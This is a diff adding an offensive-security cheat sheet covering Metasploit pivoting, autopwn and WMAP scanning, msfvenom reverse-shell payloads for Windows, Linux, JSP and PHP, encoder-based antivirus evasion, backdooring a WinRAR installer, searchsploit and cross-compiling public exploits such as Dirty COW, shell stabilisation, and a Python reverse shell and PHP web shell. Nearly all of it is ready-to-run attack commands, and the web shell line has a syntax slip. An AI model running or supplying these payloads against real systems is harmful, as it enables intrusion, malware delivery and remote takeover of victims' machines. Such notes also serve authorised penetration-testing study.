@@ -1,0 +1,158 @@
+# Pivoting
+    # Metasploit 
+        # Add route
+        run autoroute -s <NETWORK-RANGE>
+
+        # Port forwarding
+        portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
+
+
+# Add autopwn to metasploit
+    # download
+    wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+    sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
+
+    # msfconsole
+    load db_autopwn
+
+    # command
+    db_autopwn -p -t
+    db_autopwn -p -t -PI 445 # Only for port 445
+
+# WMAP in msfconsole
+    load wmap
+    wmap_sites -a <TARGET_IP>
+    wmap_sites -l
+    wmap_targets -t <URL>
+    wmap_targets -l
+
+    wmap_run -t
+    wmap_run -e
+    wmap_vulns -l
+
+    # msfconsole
+    use auxiliary/scanner/http/http_put
+
+# MSFVENOM SHELLS
+    msfvenom --list payloads
+    msfvenom --list formats
+    msfvenom --list encoders
+
+    # Win 32bit
+    msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x86>.exe
+
+    # Win 64bit
+    msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x64>.exe
+
+    # Linux 32bit
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x86>
+
+    # Linux 64bit
+    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x64>
+
+    # Win 32bit + shikata_ga_nai encoded
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe
+
+    # Use more encoding iterations
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe
+
+    # Linux 32bit + shikata_ga_nai encoded
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f elf > <PAYLOAD_ENCODED_x86>
+
+    # Inject into Portable Executables
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe
+
+    # JSP Java Meterpreter Reverse TCP
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 
+
+    # PHP
+    msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\                   #PHP Web Application
+    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+# Ressource file metasploit
+    #Content handler.rc
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST <LOCAL_HOST_IP>
+    set LPORT <LOCAL_PORT>
+    run
+
+    # Start handler.rc
+    msfconsole -q -r handler.rc
+
+# Searchsploit
+    # Install
+    sudo apt update && sudo apt -y install exploitdb
+    
+    # Update
+    searchsploit -u
+
+    # Copy an exploit to the current working dir
+    searchsploit -m <EXPLOIT_ID>    
+
+    # Case sensitive search
+    searchsploit -c OpenSSH
+    
+    # Search just the exploit title
+    searchsploit -t vsftpd
+    
+    # Exact search on title
+    searchsploit -e "Windows 7"
+
+    # Filters search
+    searchsploit remote windows smb
+    searchsploit remote linux ssh
+    searchsploit remote linux ssh OpenSSH
+    searchsploit remote webapps wordpress
+    searchsploit local windows
+    searchsploit local windows | grep -e "Microsoft"
+
+    # List online links
+    searchsploit -w remote windows smb | grep -e "EternalBlue"
+
+# Cross compilation
+    sudo apt -y install mingw-w64 gcc
+
+    ## Windows Target
+    searchsploit VideolAN VLC SMB
+    searchsploit -m 9303
+    # Compile for x64
+    x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe
+    # Compile for x86 (32-bit)
+    i686-w64-mingw32-gcc 9303.c -o exploit32.exe
+
+    ## Linux Target
+    searchsploit Dirty Cow
+    searchsploit -m 40839
+    gcc -pthread 40839.c -o dirty_exploit -lcrypt
+
+# Stabilize shells
+    # TTY
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    /usr/bin/script -qc /bin/bash /dev/null
+    perl -e 'exec "/bin/bash";'
+    perl: exec "/bin/sh";
+    ruby: exec "/bin/sh"
+    lua: os.execute('/bin/sh')
+    IRB: exec "/bin/sh"
+    vi: :!bash
+    vi: :set shell=/bin/bash:shell
+    nmap: !sh
+    script /dev/null -c bash
+
+    # ENV
+    export TERM=xterm
+    stty raw -echo;fg
+    
+# Local enum binaries and scripts 
+    # GENERIC
+    https://github.com/peass-ng/PEASS-ng/releases
+    
+    # LINUX
+    # WINDOWS
+# Reverse shell
+    # Python
+    import socket,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")
+
+    # PHP
+    <?php echo shell_exec($_GET('cmd')); ?>
